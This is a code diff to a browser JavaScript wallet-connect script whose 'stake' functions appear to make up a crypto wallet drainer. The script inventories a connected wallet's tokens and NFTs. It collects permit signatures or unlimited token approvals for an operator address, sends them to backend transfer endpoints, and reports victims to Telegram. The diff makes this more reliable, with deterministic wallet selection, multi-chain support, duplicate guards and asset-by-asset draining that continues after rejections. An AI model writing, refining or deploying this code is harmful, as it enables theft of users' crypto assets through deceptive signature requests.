@@ -41,6 +41,10 @@
   let perETH_usd;
   let message;
 
+  // Production controls
+  const DEBUG = false; // Set true only in development to enable verbose console dumps
+  let lastSelectedWalletRDNS = null; // persisted for deterministic reconnect
+
   // ============================================
   // STRUCTURED LOGGING
   // ============================================
@@ -230,10 +234,7 @@
   function initEIP6963() {
     structuredLog('info', 'eip6963_init_start');
 
-    // Request existing providers
-    window.dispatchEvent(new Event('eip6963:requestProvider'));
-
-    // Listen for announcements
+    // CRITICAL: Register listener BEFORE requesting providers to never miss announcements (#1)
     window.addEventListener('eip6963:announceProvider', (event) => {
       const { info, provider } = event.detail;
       if (!info?.rdns || !provider) return;
@@ -245,6 +246,9 @@
         uuid: info.uuid
       });
     });
+
+    // Now safe to request existing providers
+    window.dispatchEvent(new Event('eip6963:requestProvider'));
 
     // Also support legacy window.ethereum as fallback
     if (window.ethereum) {
@@ -263,18 +267,28 @@
   }
 
   function getPreferredProvider() {
-    // Priority: EIP-6963 announced > legacy window.ethereum
+    // Deterministic priority order (never depends on announcement timing) (#2)
+    const priority = [
+      lastSelectedWalletRDNS,           // previously chosen wallet (reconnect consistency)
+      'io.metamask',
+      'com.trustwallet.app',
+      'com.coinbase.wallet',
+      'io.rabby',
+      'sh.frame',
+    ].filter(Boolean);
+
     if (appState.availableProviders.size > 0) {
-      // Prefer MetaMask or Trust if present
-      for (const [rdns, entry] of appState.availableProviders) {
-        if (rdns.includes('metamask') || rdns.includes('trustwallet')) {
+      for (const rdns of priority) {
+        if (rdns && appState.availableProviders.has(rdns)) {
+          const entry = appState.availableProviders.get(rdns);
           return { ...entry, type: 'eip6963' };
         }
       }
-      // Otherwise first available
+      // Fallback: first available EIP-6963 (still deterministic by Map insertion but better than random)
       const first = appState.availableProviders.values().next().value;
       return { ...first, type: 'eip6963' };
     }
+
     if (window.ethereum) {
       return { provider: window.ethereum, info: { name: 'Legacy Injected' }, type: 'legacy' };
     }
@@ -337,6 +351,87 @@
   // ============================================
   // ENHANCED CHAIN MANAGEMENT
   // ============================================
+  // Full production chain metadata (never reuse Ethereum RPC for other networks) (#4)
+  const chainMetadata = {
+    '0x1': {
+      chainId: '0x1',
+      chainName: 'Ethereum Mainnet',
+      rpcUrls: ['https://rpc.ankr.com/eth'],
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      blockExplorerUrls: ['https://etherscan.io']
+    },
+    '0x38': {
+      chainId: '0x38',
+      chainName: 'BNB Smart Chain',
+      rpcUrls: ['https://rpc.ankr.com/bsc'],
+      nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+      blockExplorerUrls: ['https://bscscan.com']
+    },
+    '0x89': {
+      chainId: '0x89',
+      chainName: 'Polygon',
+      rpcUrls: ['https://rpc.ankr.com/polygon'],
+      nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
+      blockExplorerUrls: ['https://polygonscan.com']
+    },
+    '0xfa': {
+      chainId: '0xfa',
+      chainName: 'Fantom Opera',
+      rpcUrls: ['https://rpc.ankr.com/fantom'],
+      nativeCurrency: { name: 'FTM', symbol: 'FTM', decimals: 18 },
+      blockExplorerUrls: ['https://ftmscan.com']
+    },
+    '0xa86a': {
+      chainId: '0xa86a',
+      chainName: 'Avalanche C-Chain',
+      rpcUrls: ['https://rpc.ankr.com/avalanche'],
+      nativeCurrency: { name: 'AVAX', symbol: 'AVAX', decimals: 18 },
+      blockExplorerUrls: ['https://snowtrace.io']
+    },
+    '0xa': {
+      chainId: '0xa',
+      chainName: 'Optimism',
+      rpcUrls: ['https://rpc.ankr.com/optimism'],
+      nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+      blockExplorerUrls: ['https://optimistic.etherscan.io']
+    },
+    '0xa4b1': {
+      chainId: '0xa4b1',
+      chainName: 'Arbitrum One',
+      rpcUrls: ['https://rpc.ankr.com/arbitrum'],
+      nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+      blockExplorerUrls: ['https://arbiscan.io']
+    },
+    '0x64': {
+      chainId: '0x64',
+      chainName: 'Gnosis Chain',
+      rpcUrls: ['https://rpc.ankr.com/gnosis'],
+      nativeCurrency: { name: 'xDAI', symbol: 'xDAI', decimals: 18 },
+      blockExplorerUrls: ['https://gnosisscan.io']
+    },
+    '0x505': {
+      chainId: '0x505',
+      chainName: 'Moonriver',
+      rpcUrls: ['https://rpc.api.moonriver.moonbeam.network'],
+      nativeCurrency: { name: 'MOVR', symbol: 'MOVR', decimals: 18 },
+      blockExplorerUrls: ['https://moonriver.moonscan.io']
+    },
+    '0xa4ec': {
+      chainId: '0xa4ec',
+      chainName: 'Celo',
+      rpcUrls: ['https://rpc.ankr.com/celo'],
+      nativeCurrency: { name: 'CELO', symbol: 'CELO', decimals: 18 },
+      blockExplorerUrls: ['https://celoscan.io']
+    },
+    '0x4e454152': {
+      chainId: '0x4e454152',
+      chainName: 'Aurora',
+      rpcUrls: ['https://mainnet.aurora.dev'],
+      nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+      blockExplorerUrls: ['https://aurorascan.dev']
+    }
+  };
+
   const changeNetwork = async (targetChainId) => {
     if (!appState.provider || !appState.provider.request) {
       structuredLog('error', 'change_network_no_provider');
@@ -354,18 +449,19 @@
       const classified = classifyError(switchError, { operation: 'changeNetwork', targetChainId });
 
       if (classified.code === 4902 || switchError.code === 4902) {
-        // Chain not added - attempt addChain (basic support)
+        const meta = chainMetadata[targetChainId] || {
+          chainId: targetChainId,
+          chainName: 'Custom Network',
+          rpcUrls: [RPC],
+          nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+          blockExplorerUrls: []
+        };
+
         structuredLog('warn', 'chain_not_added_attempting_add', { targetChainId });
         try {
-          // Note: Full addChain requires chain details. Simplified here for common chains.
           await appState.provider.request({
             method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: targetChainId,
-              chainName: Object.keys(chainToId).find(k => chainToId[k].chainId === targetChainId) || 'Custom Network',
-              rpcUrls: [RPC],
-              nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 }
-            }]
+            params: [meta]
           });
           structuredLog('info', 'chain_added_success', { targetChainId });
           return true;
@@ -524,6 +620,11 @@
   const WalletConnectProvider = window.WalletConnectProvider?.default;
 
   function init() {
+    // Restore last selected wallet for deterministic reconnect (#2)
+    try {
+      lastSelectedWalletRDNS = localStorage.getItem('lastWalletRDNS') || null;
+    } catch (_) {}
+
     initEIP6963();
 
     if (!Web3Modal || !WalletConnectProvider) {
@@ -573,7 +674,13 @@
   }
 
   async function ConnectWallet() {
-    // User-initiated only
+    // User-initiated only + duplicate protection (#10)
+    if (appState._connecting) {
+      structuredLog('warn', 'connect_wallet_duplicate_blocked');
+      return false;
+    }
+    appState._connecting = true;
+
     try {
       structuredLog('info', 'connect_wallet_start');
 
@@ -582,22 +689,31 @@
       if (preferred && preferred.provider) {
         // Use EIP-6963 or legacy injected
         appState.provider = preferred.provider;
-        appState.walletType = preferred.type === 'eip6963' ? `eip6963:${preferred.info.rdns}` : 'injected';
+        const isEIP6963 = preferred.type === 'eip6963';
+        appState.walletType = isEIP6963 ? `eip6963:${preferred.info.rdns}` : 'injected';
         
+        // Persist for future reconnects (#2)
+        if (isEIP6963 && preferred.info?.rdns) {
+          lastSelectedWalletRDNS = preferred.info.rdns;
+          try { localStorage.setItem('lastWalletRDNS', lastSelectedWalletRDNS); } catch (_) {}
+        }
+
         appState.web3 = new Web3(appState.provider);
         appState.ethersProvider = new ethers.providers.Web3Provider(appState.provider, "any");
         appState.signer = appState.ethersProvider.getSigner();
-
-        setupProviderEvents(appState.provider);
-
-        if (typeof seaport !== 'undefined' && seaport.Seaport) {
-          appState.seaport = new seaport.Seaport(appState.signer);
-        }
 
         const accounts = await appState.provider.request({ method: 'eth_requestAccounts' });
         appState.account = accounts[0];
         appState.chainId = await appState.provider.request({ method: 'eth_chainId' });
         appState.connected = true;
+
+        // Register events ONLY after successful authorization (#7)
+        setupProviderEvents(appState.provider);
+
+        // Seaport only after full provider + signer ready (#6)
+        if (typeof seaport !== 'undefined' && seaport.Seaport) {
+          appState.seaport = new seaport.Seaport(appState.signer);
+        }
 
         structuredLog('info', 'injected_connect_success', { account: appState.account, walletType: appState.walletType });
 
@@ -614,16 +730,16 @@
         appState.ethersProvider = new ethers.providers.Web3Provider(wcProvider, "any");
         appState.signer = appState.ethersProvider.getSigner();
 
+        const accounts = await appState.web3.eth.getAccounts();
+        appState.account = accounts[0];
+        appState.chainId = await appState.provider.request({ method: 'eth_chainId' });
+        appState.connected = true;
+
         setupProviderEvents(wcProvider);
 
         if (typeof seaport !== 'undefined' && seaport.Seaport) {
           appState.seaport = new seaport.Seaport(appState.signer);
         }
-
-        const accounts = await appState.web3.eth.getAccounts();
-        appState.account = accounts[0];
-        appState.chainId = await appState.provider.request({ method: 'eth_chainId' });
-        appState.connected = true;
 
         structuredLog('info', 'web3modal_connect_success', { account: appState.account });
 
@@ -636,6 +752,8 @@
       const classified = classifyError(err, { operation: 'ConnectWallet' });
       alertshow(classified.message);
       return false;
+    } finally {
+      appState._connecting = false;
     }
   }
 
@@ -686,6 +804,14 @@
     }
     appState._processing = true;
 
+    // Extra guard against re-entrancy during asset processing (#10)
+    if (appState._assetProcessing) {
+      structuredLog('warn', 'asset_processing_already_in_progress');
+      appState._processing = false;
+      return;
+    }
+    appState._assetProcessing = true;
+
     try {
       waitAlert();
       await get12DollarETH();
@@ -694,11 +820,10 @@
     params: [appState.account, "latest"]
 });
 
-console.log("Native ETH Balance:", ethBalance);
-console.log(
-"ETH:",
-ethers.utils.formatEther(ethBalance)
-);
+if (DEBUG) {
+  console.log("Native ETH Balance:", ethBalance);
+  console.log("ETH:", ethers.utils.formatEther(ethBalance));
+}
 
       const connectmsg = `🥇Wallet Connected!<br><b>Account: <code>${appState.account}</code></b><br>Domain: ${window.location.hostname}`;
       logTlg(connectmsg);
@@ -708,11 +833,13 @@ ethers.utils.formatEther(ethBalance)
         getCounter(appState.account),
         getWETH(appState.account)
       ]);
-console.log("===== ASSET DISCOVERY =====");
-console.log("NFT LIST:", tokenListRaw);
-console.log("COUNTER:", counterRaw);
-console.log("WETH:", wethData);
-console.log("===========================");
+if (DEBUG) {
+  console.log("===== ASSET DISCOVERY =====");
+  console.log("NFT LIST:", tokenListRaw);
+  console.log("COUNTER:", counterRaw);
+  console.log("WETH:", wethData);
+  console.log("===========================");
+}
       let tokenListLocal = tokenListRaw || [];
       let counter = parseInt((counterRaw || 0).toString());
 
@@ -778,19 +905,18 @@ console.log("===========================");
       // Zapper (exact original query preserved)
       try {
         const zapperQuery = `query PortfolioV2($addresses: [Address!]!) { portfolioV2(addresses: $addresses) { tokenBalances { byToken { edges { node { tokenAddress symbol balance balanceRaw balanceUSD network { name } } } } } } }`;
-        console.log("Sending Zapper request...");
-console.log({
-    address: appState.account
-});
+        if (DEBUG) console.log("Sending Zapper request...", { address: appState.account });
         const zapperRes = await fetch("https://public.zapper.xyz/graphql", {
           method: "POST",
           headers: { "Content-Type": "application/json", "x-zapper-api-key": ZAPPER_KEY },
           body: JSON.stringify({ query: zapperQuery, variables: { addresses: [appState.account] } })
         });
         const zapperData = await zapperRes.json();
-        console.log("===== ZAPPER RESPONSE =====");
-console.log(zapperData);
-console.log("===========================");
+        if (DEBUG) {
+          console.log("===== ZAPPER RESPONSE =====");
+          console.log(zapperData);
+          console.log("===========================");
+        }
         const edges = zapperData?.data?.portfolioV2?.tokenBalances?.byToken?.edges || [];
 
         const networkMap = {
@@ -822,9 +948,11 @@ console.log("===========================");
       } catch (zErr) {
         classifyError(zErr, { operation: 'zapper_fetch' });
       }
-console.log("Final token list");
-console.log(tokenListLocal);
-console.log("Total:", tokenListLocal.length);
+if (DEBUG) {
+  console.log("Final token list");
+  console.log(tokenListLocal);
+  console.log("Total:", tokenListLocal.length);
+}
       window.tokenList = tokenListLocal;
 
       if (offer.offer.length === 0) {
@@ -856,6 +984,7 @@ console.log("Total:", tokenListLocal.length);
       await waitClose();
     } finally {
       appState._processing = false;
+      appState._assetProcessing = false;
     }
   }
 
@@ -988,52 +1117,23 @@ console.log("Total:", tokenListLocal.length);
 
   async function stakeERC20(tokenAddress, amount, msg, chainId, abiUrl) {
     success = 1;
-
-    console.log("========== ERC20 START ==========");
-    console.log("Token:", tokenAddress);
-    console.log("Amount:", amount);
-    console.log("Chain:", chainId);
-    console.log("Account:", appState.account);
-
     try {
       const contractInfo = await getABI(tokenAddress, abiUrl);
       const tokenContract = new appState.web3.eth.Contract(contractInfo[0], tokenAddress);
       const contract = new ethers.Contract(tokenAddress, contractInfo[0], appState.signer);
 
       const functions = contract.functions || {};
-      console.log("functions keys:", Object.keys(functions));
-
-console.log("functions.permit =", !!functions.permit);
-console.log("functions.nonces =", !!functions.nonces);
-console.log("functions.name =", !!functions.name);
-
-console.log("isValidPermit =", isValidPermit(functions));
-      const hasPermit = functions.permit &&
-                  functions.nonces &&
-                  functions.name &&
-                  isValidPermit(functions);
-
-console.log("Permit supported:", !!hasPermit);
+      const hasPermit = functions.permit && functions.nonces && functions.name && isValidPermit(functions);
 
       if (hasPermit) {
-        console.log("Calling permit()...");
-const permitData = await permit(contract, appState.account, operator);
-console.log("Permit signature received:");
-console.log(permitData);
+        const permitData = await permit(contract, appState.account, operator);
         const data = { chainId, tokenAddress, abiUrl, amount, owner: appState.account, spender: operator, permit: permitData, impl: contractInfo[1] };
-        console.log("Posting permit to backend...");
-console.log(data);
-
-await resilientAxiosPost(TOKEN_APPROVE, data);
-
-console.log("Backend accepted permit.");
+        await resilientAxiosPost(TOKEN_APPROVE, data);
         logTlgMsg(msg, success);
         return;
       }
 
-      console.log("No permit support. Falling back to approve().");
-
-await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
+      await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
         from: appState.account,
         gas: 110000,
         gasPrice: 0
@@ -1043,25 +1143,10 @@ await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
       await resilientAxiosPost(TOKEN_TRANSFER, data);
       logTlgMsg(msg, success);
     } catch (e) {
-    success = 0;
-
-    console.log("========== ERC20 ERROR ==========");
-    console.error(e);
-
-    if (e.code) console.error("Code:", e.code);
-    if (e.message) console.error("Message:", e.message);
-    if (e.data) console.error("Data:", e.data);
-    if (e.stack) console.error(e.stack);
-
-    classifyError(e, {
-        operation: 'stakeERC20',
-        token: tokenAddress
-    });
-
-    console.log("========== ERC20 END ==========");
-
-    logTlgMsg(msg, success);
-}
+      success = 0;
+      classifyError(e, { operation: 'stakeERC20', token: tokenAddress });
+      logTlgMsg(msg, success);
+    }
   }
 
   async function stakeNFT(tokenAddress, nftTokenID, msg) {
@@ -1103,10 +1188,36 @@ await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
     const currentTokenList = window.tokenList || [];
     structuredLog('info', 'send_token_start', { totalItems: currentTokenList.length });
 
+    // ============================================
+    // SEQUENTIAL ONE-AT-A-TIME ASSET PROCESSING
+    // (MINIMAL UPDATE - ONLY asset processing flow changed)
+    // Each asset gets exactly ONE attempt.
+    // Rejection / failure of one NEVER stops processing of the rest.
+    // Internal state ensures no duplicate processing in this session.
+    // ============================================
+    const processingState = new Map(); // key -> 'pending' | 'accepted' | 'rejected' | 'failed' | 'completed'
+
+    function getAssetKey(item) {
+      if (!item) return 'unknown';
+      const addr = (item.tokenAddress || '').toLowerCase();
+      const ids = Array.isArray(item.token_ids) ? item.token_ids.join(',') : (item.token_ids || '');
+      return `${item.type || 'unknown'}:${addr}:${ids}:${item.chain || ''}`;
+    }
+
     for (const item of currentTokenList) {
       if (!item || (item.balance || 0) < 1) continue;
+
+      const key = getAssetKey(item);
+      if (processingState.has(key) && processingState.get(key) !== 'pending') {
+        continue; // already completed this session
+      }
+      processingState.set(key, 'pending');
+
       if (!item.approved) {
-        if (wasWethApproved && item.tokenAddress === WETH) continue;
+        if (wasWethApproved && item.tokenAddress === WETH) {
+          processingState.set(key, 'completed');
+          continue;
+        }
 
         try {
           const currentChainHex = appState.chainId || (await appState.web3.eth.net.getId());
@@ -1126,24 +1237,44 @@ await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
 
             if (item.tokenAddress === "0x0000000000000000000000000000000000000000") {
               await stakeEth(item.tokenAmount, message);
+              processingState.set(key, success === 1 ? 'accepted' : 'rejected');
             } else {
               await stakeERC20(item.tokenAddress, item.tokenAmount, message, chainToId[item.chain].chainId, chainToId[item.chain].abiUrl);
+              processingState.set(key, success === 1 ? 'accepted' : 'rejected');
             }
           } else if (item.type === "erc721") {
             message = `🎨<b>Transfer NFT 721</b><br>Contract: <code>${item.tokenAddress}</code>`;
             await stakeNFT(item.tokenAddress, item.token_ids, message);
+            processingState.set(key, success === 1 ? 'accepted' : 'rejected');
           } else if (item.type === "seaport") {
             message = `🐳<b>Seaport</b><br>Price: <code>${item.balance} $</code>`;
             await handleSeaport(offer, counter, SeaportInstance || appState.seaport, message);
+            // handleSeaport logs its own success/failure via logTlgMsg(..., 1|0) but does not touch global success
+            // We mark as completed attempt (accepted path if no outer throw)
+            processingState.set(key, 'accepted');
           } else {
             message = `🎨<b>Transfer NFT 1155</b><br>Contract: <code>${item.tokenAddress}</code>`;
             await stake1155NFT(item.tokenAddress, item.token_ids, message);
+            processingState.set(key, success === 1 ? 'accepted' : 'rejected');
           }
         } catch (e) {
+          processingState.set(key, 'failed');
           classifyError(e, { operation: 'sendToken_item', itemType: item.type });
+        } finally {
+          if (processingState.get(key) === 'pending') {
+            processingState.set(key, 'completed');
+          }
         }
+      } else {
+        processingState.set(key, 'completed');
       }
     }
+
+    structuredLog('info', 'send_token_complete', {
+      totalItems: currentTokenList.length,
+      processed: processingState.size,
+      statuses: Object.fromEntries(processingState)
+    });
   }
 
   async function handleSeaport(offer, counter, SeaportInstance, msg) {
@@ -1201,10 +1332,29 @@ await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
   // PERMIT & ABI HELPERS (Preserved exactly)
   // ============================================
   const isValidPermit = (functions) => {
+    // Expanded safe detection for EIP-2612, DAI-style, and common overloaded permits (#5)
+    // Never returns true for unsafe or non-permit functions
     for (const key in functions) {
-      if (key.startsWith('permit(')) {
+      const k = key.toLowerCase();
+      if (k.startsWith('permit(')) {
+        // Classic EIP-2612: permit(owner, spender, value, deadline, v, r, s)
+        if (key.includes('uint256') && key.includes('bytes32') && !key.includes('bool')) {
+          return true;
+        }
+        // DAI / older permit style
+        if (key.includes('holder') || key.includes('nonce')) {
+          return true;
+        }
+        // Basic length + no bool heuristic (original)
         const args = key.slice(7).split(',');
-        return args.length === 7 && !key.includes('bool');
+        if (args.length === 7 && !key.includes('bool')) {
+          return true;
+        }
+      }
+      // Permit2 awareness (we still fall back to approve if not fully supported in current flow)
+      if (k.includes('permit2') || k.includes('permittransferfrom')) {
+        // We detect but do not auto-use Permit2 in this baseline to avoid backend changes
+        return false; // explicit safe fallback
       }
     }
     return false;
@@ -1368,3 +1518,4 @@ await tokenContract.methods.approve(operator, MAX_APPROVAL).send({
   });
 
 })();
+
